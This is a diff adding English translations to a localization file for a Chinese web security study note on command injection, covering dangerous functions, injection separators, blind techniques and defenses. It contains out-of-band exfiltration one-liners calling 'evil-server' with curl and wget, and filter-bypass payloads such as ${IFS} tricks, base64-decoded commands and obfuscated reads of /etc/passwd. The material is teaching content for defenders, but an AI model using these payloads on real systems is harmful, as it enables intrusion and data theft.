@@ -5,7 +5,7 @@
 #
 msgid ""
 msgstr ""
-"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Project-Id-Version: Web Security Study Notes 1.0\n"
 "Report-Msgid-Bugs-To: \n"
 "POT-Creation-Date: 2026-06-17 07:02+0800\n"
 "PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
@@ -20,144 +20,153 @@ msgstr ""
 
 #: ../../source/vuln/cmdinjection.rst:2
 msgid "命令注入"
-msgstr ""
+msgstr "Command Injection"
 
 #: ../../source/vuln/cmdinjection.rst:5
 msgid "简介"
-msgstr ""
+msgstr "Overview"
 
 #: ../../source/vuln/cmdinjection.rst:6
 msgid "命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。"
 msgstr ""
+"Command injection usually refers to vulnerabilities caused when a web "
+"application concatenates system commands on the server."
 
 #: ../../source/vuln/cmdinjection.rst:8
 msgid "该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。"
 msgstr ""
+"This type of vulnerability often appears when external programs are called "
+"to implement functionality. Examples include web management interfaces for "
+"configuring hostnames, IP addresses, masks, and gateways, viewing system "
+"information, shutting down or restarting systems, and sites that provide "
+"ping, nslookup, mail sending, image conversion, and similar features."
 
 #: ../../source/vuln/cmdinjection.rst:11
 msgid "常见危险函数"
-msgstr ""
+msgstr "Common Dangerous Functions"
 
 #: ../../source/vuln/cmdinjection.rst:14
 msgid "PHP"
-msgstr ""
+msgstr "PHP"
 
 #: ../../source/vuln/cmdinjection.rst:15 ../../source/vuln/cmdinjection.rst:24
 msgid "system"
-msgstr ""
+msgstr "system"
 
 #: ../../source/vuln/cmdinjection.rst:16
 msgid "exec"
-msgstr ""
+msgstr "exec"
 
 #: ../../source/vuln/cmdinjection.rst:17
 msgid "passthru"
-msgstr ""
+msgstr "passthru"
 
 #: ../../source/vuln/cmdinjection.rst:18
 msgid "shell_exec"
-msgstr ""
+msgstr "shell_exec"
 
 #: ../../source/vuln/cmdinjection.rst:19 ../../source/vuln/cmdinjection.rst:25
 msgid "popen"
-msgstr ""
+msgstr "popen"
 
 #: ../../source/vuln/cmdinjection.rst:20
 msgid "proc_open"
-msgstr ""
+msgstr "proc_open"
 
 #: ../../source/vuln/cmdinjection.rst:23
 msgid "Python"
-msgstr ""
+msgstr "Python"
 
 #: ../../source/vuln/cmdinjection.rst:26
 msgid "subprocess.call"
-msgstr ""
+msgstr "subprocess.call"
 
 #: ../../source/vuln/cmdinjection.rst:27
 msgid "spawn"
-msgstr ""
+msgstr "spawn"
 
 #: ../../source/vuln/cmdinjection.rst:30
 msgid "Java"
-msgstr ""
+msgstr "Java"
 
 #: ../../source/vuln/cmdinjection.rst:31
 msgid "java.lang.Runtime.getRuntime().exec(command)"
-msgstr ""
+msgstr "java.lang.Runtime.getRuntime().exec(command)"
 
 #: ../../source/vuln/cmdinjection.rst:34
 msgid "常见注入方式"
-msgstr ""
+msgstr "Common Injection Methods"
 
 #: ../../source/vuln/cmdinjection.rst:35
 msgid "分号分割"
-msgstr ""
+msgstr "Separate commands with semicolons"
 
 #: ../../source/vuln/cmdinjection.rst:36
 msgid "``||`` ``&&`` ``&`` 分割"
-msgstr ""
+msgstr "Separate commands with ``||`` ``&&`` ``&``"
 
 #: ../../source/vuln/cmdinjection.rst:37
 msgid "``|`` 管道符"
-msgstr ""
+msgstr "``|`` pipe operator"
 
 #: ../../source/vuln/cmdinjection.rst:38
 #, python-format
 msgid "``\\r\\n`` ``%d0%a0`` 换行"
-msgstr ""
+msgstr "``\\r\\n`` ``%d0%a0`` line breaks"
 
 #: ../../source/vuln/cmdinjection.rst:39
 msgid "反引号解析"
-msgstr ""
+msgstr "Backtick evaluation"
 
 #: ../../source/vuln/cmdinjection.rst:40
 msgid "``$()`` 替换"
-msgstr ""
+msgstr "``$()`` substitution"
 
 #: ../../source/vuln/cmdinjection.rst:43
 msgid "无回显技巧"
-msgstr ""
+msgstr "Blind Exploitation Techniques"
 
 #: ../../source/vuln/cmdinjection.rst:44
 msgid "bash反弹shell"
-msgstr ""
+msgstr "Bash reverse shell"
 
 #: ../../source/vuln/cmdinjection.rst:45
 msgid "DNS带外数据"
-msgstr ""
+msgstr "DNS out-of-band data"
 
 #: ../../source/vuln/cmdinjection.rst:46
 msgid "http带外"
-msgstr ""
+msgstr "HTTP out-of-band channel"
 
 #: ../../source/vuln/cmdinjection.rst:47
 msgid "``curl http://evil-server/$(whoami)``"
-msgstr ""
+msgstr "``curl http://evil-server/$(whoami)``"
 
 #: ../../source/vuln/cmdinjection.rst:48
 msgid "``wget http://evil-server/$(whoami)``"
-msgstr ""
+msgstr "``wget http://evil-server/$(whoami)``"
 
 #: ../../source/vuln/cmdinjection.rst:49
 msgid "无带外时利用 ``sleep`` 或其他逻辑构造布尔条件"
 msgstr ""
+"When no out-of-band channel is available, use ``sleep`` or other logic to "
+"construct Boolean conditions"
 
 #: ../../source/vuln/cmdinjection.rst:52
 msgid "常见绕过方式"
-msgstr ""
+msgstr "Common Bypass Methods"
 
 #: ../../source/vuln/cmdinjection.rst:55
 msgid "空格绕过"
-msgstr ""
+msgstr "Space Bypass"
 
 #: ../../source/vuln/cmdinjection.rst:56
 msgid "``<`` 符号 ``cat<123``"
-msgstr ""
+msgstr "``<`` operator, such as ``cat<123``"
 
 #: ../../source/vuln/cmdinjection.rst:57
 msgid "``\\t`` / ``%09``"
-msgstr ""
+msgstr "``\\t`` / ``%09``"
 
 #: ../../source/vuln/cmdinjection.rst:58
 #, python-brace-format
@@ -165,109 +174,122 @@ msgid ""
 "``${IFS}`` "
 "其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串"
 msgstr ""
+"``${IFS}``; the braces are used for truncation. For example, ``cat$IFS2`` is"
+" treated as the variable name ``IFS2``. Adding ``$`` afterward can also "
+"truncate the expression; ``$9`` is commonly used because it refers to the "
+"ninth argument of the current shell process and is always an empty string."
 
 #: ../../source/vuln/cmdinjection.rst:61
 msgid "黑名单绕过"
-msgstr ""
+msgstr "Blacklist Bypass"
 
 #: ../../source/vuln/cmdinjection.rst:62
 msgid "``a=l;b=s;$a$b``"
-msgstr ""
+msgstr "``a=l;b=s;$a$b``"
 
 #: ../../source/vuln/cmdinjection.rst:63
 msgid "base64 ``echo \"bHM=\" | base64 -d``"
-msgstr ""
+msgstr "base64 ``echo \"bHM=\" | base64 -d``"
 
 #: ../../source/vuln/cmdinjection.rst:64
 msgid "``/?in/?s`` => ``/bin/ls``"
-msgstr ""
+msgstr "``/?in/?s`` => ``/bin/ls``"
 
 #: ../../source/vuln/cmdinjection.rst:65
 msgid "连接符 ``cat /etc/pass'w'd``"
-msgstr ""
+msgstr "String concatenation ``cat /etc/pass'w'd``"
 
 #: ../../source/vuln/cmdinjection.rst:66
 msgid "未定义的初始化变量 ``cat$x /etc/passwd``"
-msgstr ""
+msgstr "Undefined initialized variable ``cat$x /etc/passwd``"
 
 #: ../../source/vuln/cmdinjection.rst:69
 msgid "长度限制绕过"
-msgstr ""
+msgstr "Length Limit Bypass"
 
 #: ../../source/vuln/cmdinjection.rst:78
 msgid ""
 "上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 "
-"直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls "
-"/usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec "
-"等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件"
+"直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) "
+"如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , "
+"是不存在标准输入流的，所以可以直接创建文件"
 msgstr ""
+"The method above writes commands through command-line redirection, then uses"
+" ``ls`` sorted by time to write the commands into a file, and finally "
+"executes it. When running directly in a Linux terminal, creating the file "
+"requires adding a command before the redirection operator. Short commands "
+"such as ``w`` or ``[`` can be used here; use ``ls /usr/bin/?`` to list "
+"candidates. Without such a command, ``Ctrl+D`` is required to end input, "
+"which is equivalent to redirecting standard input. In PHP, when functions "
+"such as ``shell_exec`` execute system commands, there is no standard input "
+"stream, so the file can be created directly."
 
 #: ../../source/vuln/cmdinjection.rst:85
 msgid "常用符号"
-msgstr ""
+msgstr "Common Symbols"
 
 #: ../../source/vuln/cmdinjection.rst:88
 msgid "命令分隔符"
-msgstr ""
+msgstr "Command Separators"
 
 #: ../../source/vuln/cmdinjection.rst:89
 #, python-format
 msgid "``%0a`` / ``%0d`` / ``\\n`` / ``\\r``"
-msgstr ""
+msgstr "``%0a`` / ``%0d`` / ``\\n`` / ``\\r``"
 
 #: ../../source/vuln/cmdinjection.rst:90
 msgid "``;``"
-msgstr ""
+msgstr "``;``"
 
 #: ../../source/vuln/cmdinjection.rst:91
 msgid "``&`` / ``&&``"
-msgstr ""
+msgstr "``&`` / ``&&``"
 
 #: ../../source/vuln/cmdinjection.rst:94
 msgid "通配符"
-msgstr ""
+msgstr "Wildcards"
 
 #: ../../source/vuln/cmdinjection.rst:95
 msgid "``*`` 0到无穷个任意字符"
-msgstr ""
+msgstr "``*`` zero or more arbitrary characters"
 
 #: ../../source/vuln/cmdinjection.rst:96
 msgid "``?`` 一个任意字符"
-msgstr ""
+msgstr "``?`` one arbitrary character"
 
 #: ../../source/vuln/cmdinjection.rst:97
 msgid "``[ ]``  一个在括号内的字符，e.g. ``[abcd]``"
-msgstr ""
+msgstr "``[ ]`` one character inside the brackets, e.g. ``[abcd]``"
 
 #: ../../source/vuln/cmdinjection.rst:98
 msgid "``[ - ]``  在编码顺序内的所有字符"
-msgstr ""
+msgstr "``[ - ]`` all characters within the encoding order"
 
 #: ../../source/vuln/cmdinjection.rst:99
 msgid "``[^ ]`` 一个不在括号内的字符"
-msgstr ""
+msgstr "``[^ ]`` one character not inside the brackets"
 
 #: ../../source/vuln/cmdinjection.rst:102
 msgid "防御"
-msgstr ""
+msgstr "Defense"
 
 #: ../../source/vuln/cmdinjection.rst:103
 msgid "不使用时禁用相应函数"
-msgstr ""
+msgstr "Disable the relevant functions when they are not needed"
 
 #: ../../source/vuln/cmdinjection.rst:104
 msgid "尽量不要执行外部的应用程序或命令"
-msgstr ""
+msgstr "Avoid executing external applications or commands whenever possible"
 
 #: ../../source/vuln/cmdinjection.rst:105
 msgid "做输入的格式检查"
-msgstr ""
+msgstr "Validate the format of input"
 
 #: ../../source/vuln/cmdinjection.rst:106
 msgid "转义命令中的所有shell元字符"
-msgstr ""
+msgstr "Escape all shell metacharacters in commands"
 
 #: ../../source/vuln/cmdinjection.rst:107
 #, python-brace-format
 msgid "shell元字符包括 ``#&;`,|*?~<>^()[]{}$\\``"
-msgstr ""
+msgstr "Shell metacharacters include ``#&;`,|*?~<>^()[]{}$\\``"
